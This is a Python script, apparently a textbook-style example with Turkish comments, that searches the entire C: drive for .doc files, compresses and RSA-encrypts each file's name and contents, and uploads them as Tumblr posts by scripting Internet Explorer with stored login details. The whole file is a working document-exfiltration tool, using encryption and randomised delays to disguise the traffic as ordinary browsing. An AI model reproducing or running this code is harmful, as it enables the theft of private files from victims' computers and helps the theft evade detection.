import win32com.client
import os
import fnmatch
import time
import random
import zlib
import base64

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"
username = "test@test.com"
password = "testpassword"

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyXUTgFoL/2EPKoN31l5T
lak7VxhdusNCWQKDfcN5Jj45GQ1oZZjsECQ8jK5AaQuCWdmEQkgCEV23L2y71G+T
h/zlVPjp0hgC6nOKOuwmlQ1jGvfVvaNZ0YXrs+sX/wg5FT/bTS4yzXeW6920tdls
2N7Pu5N1FLRW5PMhk6GW5rzVhwdDvnfaUoSVj7oKaIMLbN/TENvnwhZZKlTZeK79
ix4qXwYLe66CrgCHDf4oBJ/nO1oYwelxuIXVPhIZnVpkbz3IL6BfEZ3ZDKzGeRs6
YLZuR2u5KUbr9uabEzgtrLyOeoK8UscKmzOvtwxZDcgNijqMJKuqpNZczPHmf9cS
1wIDAQAB
-----END PUBLIC KEY-----"""


def wait_for_browser(browser):
    # tarayıcının bir sayfayı yüklemeyi bitirmesini bekleyin
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return


def encrypt_string(plaintext):
    chunk_size = 208
    if isinstance(plaintext, (str)):
        plaintext = plaintext.encode()
    print("Compressing: %d bytes" % len(plaintext))
    plaintext = zlib.compress(plaintext)
    print("Encrypting %d bytes" % len(plaintext))

    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)
    encrypted = b""
    offset = 0

    while offset < len(plaintext):
        chunk = plaintext[offset:offset + chunk_size]
        if len(chunk) % chunk_size != 0:
            chunk += b" " * (chunk_size - len(chunk))
        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size

    encrypted = base64.b64encode(encrypted)
    print("Base64 encoded crypto: %d" % len(encrypted))
    return encrypted


def encrypt_post(filename):
    # dosyayı aç ve oku
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()

    encrypted_title = encrypt_string(filename)
    encrypted_body = encrypt_string(contents)

    return encrypted_title, encrypted_body


def random_sleep():
    time.sleep(random.randint(5, 10))
    return


def login_to_tumblr(ie):
    # belgedeki tüm öğeleri al
    full_doc = ie.Document.all

    # çıkış formunu aramayı tekrarla
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)

    random_sleep()

    # farklı ana sayfalarla oluşturulabilir
    try:
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError:
        pass

    random_sleep()

    # giriş formu sayfadaki ikinci formdur
    wait_for_browser(ie)
    return


def post_to_tumblr(ie, title, post):
    full_doc = ie.Document.all

    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value", title)
            title_box = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML", post)
            print("Set text area")
            i.focus()
        elif i.id == "create_post":
            print("Found post button")
            post_form = i
            i.focus()

    # odağı ana içerik kutusundan uzaklaştır
    random_sleep()
    title_box.focus()
    random_sleep()

    # formu gönder
    post_form.children[0].click()
    wait_for_browser(ie)

    random_sleep()
    return


def exfiltrate(document_path):
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1

    # tumblr'a gidin ve giriş yapın
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)

    print("Logging in...")
    login_to_tumblr(ie)
    print("Logged in...navigating")

    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)

    # dosyayı şifrele
    title, body = encrypt_post(document_path)

    print("Creating new post...")
    post_to_tumblr(ie, title, body)
    print("Posted!")

    # IE örneğini yok edin
    ie.Quit()
    ie = None

    return


# belge keşfi için ana döngü
for parent, directories, filenames in os.walk("C:\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
        document_path = os.path.join(parent, filename)
        print("Found: %s" % document_path)
        exfiltrate(document_path)
        input("Continue?")
